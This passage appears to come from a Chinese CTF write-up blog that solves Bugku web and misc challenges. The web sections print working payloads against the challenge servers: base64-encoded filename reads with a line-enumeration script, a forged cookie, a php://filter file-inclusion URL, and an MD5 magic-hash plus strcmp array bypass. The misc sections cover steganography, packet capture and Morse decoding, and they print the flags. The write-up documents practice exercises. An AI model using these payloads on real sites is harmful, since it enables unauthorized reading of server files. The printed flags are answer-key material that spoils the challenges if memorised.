title="题目地址">题目地址</a></p><p>访问后url变成：</p><pre><code>http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</code></pre><p>filename参数解一下码</p><pre><code>a2V5cy50eHQ=  --&gt; key.txt</code></pre><p>于是乎：</p><pre><code>index.php --&gt; aW5kZXgucGhw</code></pre><p>访问:</p><pre><code>http://120.24.86.145:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw</code></pre><p>源代码中有&lt;?php,<br>line参数是指的回显代码的行数，写个脚本遍历一下。</p><pre><code>#-*-coding:utf-8-*-import requestsfor i in range(50):url = &quot;http://120.24.86.145:8002/web11/index.php?line=&quot;+str(i)+&quot;&amp;filename=aW5kZXgucGhw&quot;r = requests.get(url).contentprint(r),</code></pre><p>获得的源代码为：</p><pre><code>&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);$line=isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;if($file==&#39;&#39;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);$file_list = array(&#39;0&#39; =&gt;&#39;keys.txt&#39;,&#39;1&#39; =&gt;&#39;index.php&#39;,);if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;)&#123;    $file_list[2]=&#39;keys.php&#39;;&#125;if(in_array($file, $file_list))&#123;    $fa = file($file);    echo $fa[$line];&#125;?&gt;</code></pre><p>审计代码可知：<br>​<br>    构造cookie为：<br>    Cookie: margin=margin<br>然后读取key.php的值<br>​<br>    <?php $key='KEY{key_keys}'; ?><br>flag为：</p><pre><code>KEY&#123;key_keys&#125;</code></pre><h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><p><a href="http://120.24.86.145:8002/web5/" title="题目地址">题目地址</a></p><p>右键查看源代码。。JSfuck代码，直接扔控制台里执行。</p><pre><code>([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+!+[]]]+(+(!+[]+!+[]+!+[]+[!+[]+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]])+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]])</code></pre><p>运行出flag:</p><pre><code>CTF&#123;whatfk&#125;</code></pre><h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p><a href="http://120.24.86.145:8005/post/" title="题目地址">题目地址</a></p><p>打开题目后有个链接，尝试点击了下，url变为</p><pre><code>http://120.24.86.145:8005/post/index.php?file=show.php</code></pre><p>结合题目的提示，flag在index里。猜测是文件包含，然后尝试file=index.php和file=index，并没有结果，而且丧心病狂的返回了。上万条bugku的宣传。。</p><p>然后尝试phpfilter协议读取index.php的内容</p><pre><code>http://120.24.86.145:8005/post/index.php?file=php://filter/convert.base64-encode/resource=index.php</code></pre><p>成功读取数据<br>​<br>    PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg==<br>Base64解码得：</p><pre><code>&lt;html&gt;&lt;title&gt;Bugku-ctf&lt;/title&gt;&lt;?phperror_reporting(0);if(!$_GET[file])&#123;echo &#39;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#39;;&#125;$file=$_GET[&#39;file&#39;];if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;    echo &quot;Oh no!&quot;;    exit();&#125;include($file); //flag:flag&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt;</code></pre><p>flag为：</p><pre><code>flag&#123;edulcni_elif_lacol_si_siht&#125;</code></pre><h2 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h2><p><a href="http://47.93.190.246:49162/" title="题目地址">题目地址</a></p><p>右键查看源代码，发现code.txt，点击获取源代码。</p><pre><code>&lt;?phpif(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;    $v1 = $_GET[&#39;v1&#39;];    $v2 = $_GET[&#39;v2&#39;];    $v3 = $_GET[&#39;v3&#39;];    if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;        if(!strcmp($v3, $flag))&#123;            echo $flag;        &#125;    &#125;&#125;?&gt;</code></pre><p>payload:<br>​<br>    <a href="http://47.93.190.246:49162/?v1=QNKCDZO&amp;v2=s878926199a&amp;v3%5B1%5D=1">http://47.93.190.246:49162/?v1=QNKCDZO&amp;v2=s878926199a&amp;v3[1]=1</a></p><p>flag为：<br>​<br>    SKCTF{Php_1s_tH3_B3St_L4NgUag3}</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h2><p><a href="http://123.206.31.85/files/9ba3671dc645c1c05d8690b28f90f969/2.rar" title="题目地址">题目地址</a></p><p>这题分数虽然少，但是get到了新姿势。</p><p>把文件下载下来，一通工具分析。。并没有找到什么有价值的东西。看了看writeup，才知道要通过Winhex修改图片文件显示的长和宽才可以，该图片实际在下面有flag，但是由于显示的宽度不够，导致下面的那一部分不能够显示。</p><p><img src="https://image.mengsec.com/Bugku-Misc-%E9%9A%90%E5%86%992_1.png"><br>图示中左侧表示图像的宽，右侧表示图像的高，解题思路，就是将01修改的大一些，使得图像可显示的高度变大，由此显示出flag</p><p><img src="https://image.mengsec.com/Bugku-Misc-%E9%9A%90%E5%86%992_2.png"></p><p>这应该算是老套路了，但是我第一次见，记一下。</p><h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p><a href="http://120.24.86.145:8002/misc/telnet/1.zip" title="题目地址">题目地址</a></p><p>水题。。数据包用wireshark打开，题目提示telnet,随便右键选一个telnet类型的数据，右键追踪流，获得flag。</p><p><img src="https://image.mengsec.com/Bugku-Misc-telnet-1.png"></p><h2 id="这是一张单纯的图片？"><a href="#这是一张单纯的图片？" class="headerlink" title="这是一张单纯的图片？"></a>这是一张单纯的图片？</h2><p><a href="http://120.24.86.145:8002/misc/1.jpg" title="题目地址">题目地址</a></p><p>使用神器StegSolve打开文件，然后File Format打开，发现有特殊的字符串</p><pre><code>&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32; &amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;。</code></pre><p>是unicode编码，网上找工具解开即可。</p><pre><code>key&#123;you are right&#125;</code></pre><h2 id="听首音乐"><a href="#听首音乐" class="headerlink" title="听首音乐"></a>听首音乐</h2><p>下载地址：</p><pre><code>链接: http://pan.baidu.com/s/1gfvezBl 密码: y6gh</code></pre><p>将音乐打开，听了一会，在左声道中听到了滴滴答答的声音。确定为摩尔斯电码，使用Audacity分析</p><p>图片1</p><p>放大后根据频谱将摩尔斯电码提取出来</p><pre><code>..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.</code></pre><p>解码得</p><pre><code>5BC925649CB0188F52E617D70929191C</code></pre><p>直接提交即可</p><h2 id="妹子的陌陌"><a href="#妹子的陌陌" class="headerlink" title="妹子的陌陌"></a>妹子的陌陌</h2><p><a href="http://120.24.86.145:8002/misc/momo.jpg" 